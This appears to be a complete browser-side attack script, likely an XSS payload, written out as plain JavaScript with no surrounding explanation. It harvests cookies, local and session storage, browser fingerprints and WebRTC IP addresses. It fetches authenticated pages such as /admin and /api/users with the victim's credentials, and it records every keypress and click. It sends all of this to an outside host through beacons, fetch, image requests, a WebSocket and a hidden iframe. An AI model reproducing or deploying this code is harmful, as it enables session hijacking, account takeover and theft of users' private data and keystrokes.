(function () {
  'use strict';

  var HOOK = 'https://spiky.team/fortmess/log';
  var HOOK_WS = 'wss://spiky.team/fortmess/ws';
  var NS_XHTML = 'http://www.w3.org/1999/xhtml';

  function safe(fn, fallback) {
    try { return fn(); } catch (e) { return fallback; }
  }

  function send(tag, data) {
    var payload = JSON.stringify({
      tag: tag,
      ts: Date.now(),
      data: data
    });

    safe(function () {
      navigator.sendBeacon(HOOK + '/' + tag, payload);
    });

    safe(function () {
      fetch(HOOK + '/' + tag, {
        method: 'POST',
        mode: 'no-cors',
        keepalive: true,
        body: payload
      });
    });

    safe(function () {
      var small = encodeURIComponent(payload.slice(0, 1500));
      new Image().src = HOOK + '/' + tag + '?d=' + small + '&r=' + Math.random();
    });

    safe(function () {
      var ws = new WebSocket(HOOK_WS);
      ws.onopen = function () { ws.send(payload); ws.close(); };
    });

    safe(function () {
      var ifr = document.createElementNS(NS_XHTML, 'iframe');
      ifr.src = HOOK + '/' + tag + '?d=' + encodeURIComponent(payload.slice(0, 1500));
      ifr.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;border:0;';
      document.documentElement.appendChild(ifr);
    });
  }
  function collect() {
    var d = {
      origin: location.origin,
      href: location.href,
      referrer: document.referrer,
      cookie: safe(function () { return document.cookie; }, ''),
      ua: navigator.userAgent,
      platform: navigator.platform,
      lang: navigator.language,
      langs: safe(function () { return (navigator.languages || []).join(','); }, ''),
      tz: safe(function () { return Intl.DateTimeFormat().resolvedOptions().timeZone; }, ''),
      tzOffset: new Date().getTimezoneOffset(),
      cores: navigator.hardwareConcurrency,
      mem: navigator.deviceMemory,
      touch: navigator.maxTouchPoints,
      screen: screen.width + 'x' + screen.height,
      viewport: innerWidth + 'x' + innerHeight,
      dpr: devicePixelRatio,
      colorDepth: screen.colorDepth,
      online: navigator.onLine,
      dnt: navigator.doNotTrack,
      pdfViewer: navigator.pdfViewerEnabled,
      webdriver: navigator.webdriver,
      ls: {},
      ss: {}
    };

    safe(function () {
      for (var i = 0; i < localStorage.length; i++) {
        var k = localStorage.key(i);
        d.ls[k] = localStorage.getItem(k);
      }
    });
    safe(function () {
      for (var i = 0; i < sessionStorage.length; i++) {
        var k = sessionStorage.key(i);
        d.ss[k] = sessionStorage.getItem(k);
      }
    });

    safe(function () {
      var c = document.createElementNS(NS_XHTML, 'canvas');
      c.width = 300; c.height = 60;
      var ctx = c.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60'; ctx.fillRect(0, 0, 120, 20);
      ctx.fillStyle = '#069'; ctx.fillText('fp ъыва', 2, 22);
      d.canvas = c.toDataURL().slice(0, 200);
    });

    safe(function () {
      var c = document.createElementNS(NS_XHTML, 'canvas');
      var gl = c.getContext('webgl');
      var dbg = gl.getExtension('WEBGL_debug_renderer_info');
      d.webgl = {
        vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
        renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
        version: gl.getParameter(gl.VERSION)
      };
    });

    safe(function () {
      var AC = window.AudioContext || window.webkitAudioContext;
      var ac = new AC();
      d.audio = { sampleRate: ac.sampleRate, state: ac.state };
    });

    safe(function () {
      var test = document.createElementNS(NS_XHTML, 'span');
      test.setAttribute('style', 'position:absolute;left:-9999px;font-size:72px;');
      test.textContent = 'mmmmmmmmmmlli';
      document.documentElement.appendChild(test);
      var base = {};
      ['monospace', 'sans-serif', 'serif'].forEach(function (f) {
        test.style.fontFamily = f;
        base[f] = test.offsetWidth + 'x' + test.offsetHeight;
      });
      var fonts = ['Arial','Verdana','Times New Roman','Courier New','Tahoma',
                   'Georgia','Comic Sans MS','Impact','Consolas','Calibri',
                   'Segoe UI','Roboto','Helvetica','Ubuntu','Menlo'];
      var found = [];
      fonts.forEach(function (font) {
        ['monospace', 'sans-serif', 'serif'].forEach(function (gen) {
          test.style.fontFamily = '"' + font + '",' + gen;
          var dd = test.offsetWidth + 'x' + test.offsetHeight;
          if (dd !== base[gen] && found.indexOf(font) === -1) found.push(font);
        });
      });
      document.documentElement.removeChild(test);
      d.fonts = found;
    });

    // Network Information
    safe(function () {
      var n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (n) d.net = { type: n.effectiveType, downlink: n.downlink, rtt: n.rtt, saveData: n.saveData };
    });

    return d;
  }

  function webrtc(done) {
    var ips = [];
    safe(function () {
      var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      pc.createDataChannel('x');
      pc.createOffer().then(function (o) { pc.setLocalDescription(o); });
      pc.onicecandidate = function (e) {
        if (!e.candidate) { done(ips); return; }
        var m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
        if (m && ips.indexOf(m[0]) === -1) ips.push(m[0]);
      };
      setTimeout(function () { done(ips); }, 2000);
    });
  }

  function dumpPages() {
    var paths = ['/', '/profile', '/settings', '/admin', '/api/me', '/api/users'];
    paths.forEach(function (p) {
      safe(function () {
        fetch(p, { credentials: 'include' })
          .then(function (r) {
            return r.text().then(function (t) {
              send('page', {
                path: p,
                status: r.status,
                len: t.length,
                body: t.slice(0, 20000)
              });
            });
          })
          .catch(function () {});
      });
    });
  }

  function keylog() {
    safe(function () {
      document.addEventListener('keypress', function (e) {
        send('key', { k: e.key, t: Date.now() });
      });
    });
    safe(function () {
      document.addEventListener('click', function (e) {
        send('click', { x: e.clientX, y: e.clientY, tag: e.target && e.target.tagName });
      });
    });
  }

  send('hello', { href: location.href, ua: navigator.userAgent });

  var data = collect();
  webrtc(function (ips) {
    data.webrtc = ips;
    send('full', data);
  });

  dumpPages();
  keylog();

  setTimeout(function () { send('full2', collect()); }, 3000);

})();